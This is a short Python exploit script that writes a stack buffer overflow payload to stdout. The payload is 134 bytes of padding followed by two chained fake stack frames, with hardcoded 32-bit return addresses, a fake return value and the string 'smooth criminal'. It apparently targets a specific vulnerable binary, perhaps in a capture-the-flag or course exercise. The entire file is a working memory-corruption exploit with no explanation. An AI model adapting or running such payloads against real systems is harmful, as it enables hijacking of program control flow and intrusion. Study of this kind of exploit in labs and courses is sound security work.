#!/usr/bin/env python3

import sys

oflow = b'A' * 134
string = b"smooth criminal\0"
fakeret = b'\xef\xbe\xad\xde'

stack_base=0xffffd76c

string_addr = stack_base + 0x1c
frames = [
        [ b'\xab\x88\x04\x08', b'\xf1\x88\x04\x08', b'\x02\x00\x00\x00', string_addr.to_bytes(4, byteorder='little') ],
        [ b'\xe3\xd0\x06\x08', fakeret, b'\x00\x00\x00\x00' ]
        ]

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
